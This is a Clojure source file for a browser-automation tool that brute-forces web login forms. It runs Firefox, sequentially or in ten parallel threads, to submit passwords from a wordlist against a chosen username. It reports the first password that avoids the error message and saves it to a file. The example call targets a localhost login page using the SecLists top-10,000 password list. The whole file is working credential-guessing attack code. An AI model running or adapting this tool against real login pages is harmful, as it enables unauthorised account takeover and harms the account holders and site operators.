(ns browser-fuzzer.core
  (:gen-class)
  (:require
   [clojure.java.io :as io]
   [clj-webdriver.taxi :as t]
   [clj-webdriver.firefox :as t-ff]
   [clj-webdriver.core :as t-c]
   [clojure.string :as str]
   [clojure.core.async 
    :as a
    :refer [>! <! >!! <!! go chan buffer close! thread
            alts! alts!! timeout
            pipeline-async]]))

(defn fuzz-site [{:keys [site error-fn user-field pass-field submit-field username pass-seq]}]
  (let [driver (t/new-driver {:browser :firefox})]
    (loop [i 0]
      (if (>= i (count pass-seq))
        (t/close driver)
        (do
          (t/to driver site)
          (t/wait-until driver #(t/exists? % user-field) 5000 0)
          (t/input-text driver (t/find-element driver user-field) username)
          (t/input-text driver (t/find-element driver pass-field) (nth pass-seq i))
          (t/click driver submit-field)
          (Thread/sleep 500)
          (if-not (error-fn driver)
            (println "Password found: " (nth pass-seq i))
            (recur (inc i))))))))

(defn fuzz-site-p [{:keys [site error-fn user-field pass-field submit-field username pass-seq]}]
  (let [pass-chan (chan)]
      (do
        (a/onto-chan pass-chan pass-seq)
        #_(a/put! pass-chan :close)
        (dotimes [n 10] 
          (let [driver (t/new-driver {:browser :firefox})]
            (thread
             (loop []
               (when-some [next-pass (<!! pass-chan)]
                 (if (= next-pass :close)
                   (a/close! pass-chan)
                   (do
                     (t/to driver site)
                     (t/wait-until driver #(t/exists? % user-field) 5000 0)
                     (t/input-text driver (t/find-element driver user-field) username)
                     (t/input-text driver (t/find-element driver pass-field) next-pass)
                     #_(println "Thread " n " pass: " next-pass)
                     (t/click driver submit-field)
                     (timeout 500)
                     (if-not (error-fn driver)
                       (do
                         (println "Password found: " next-pass)
                         (spit "pass_found" next-pass)
                         (a/close! pass-chan))
                       (recur))))))))))))

(defn -main
  "I don't do a whole lot ... yet."
  [& args]
  (println "I'm not used yet! Use REPL"))

(comment

;DEV AREA

  (fuzz-site-p {:site "http://localhost:8080/login"
                :user-field {:name "username"}
                :pass-field {:name "password"}
                :submit-field {:name "submit"}
                :username "ted"
                :pass-seq  (reverse (str/split-lines (slurp "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/10_million_password_list_top_10000.txt")))
                :error-fn #(str/includes? (t/html % "body") "Bad credentials")})

)
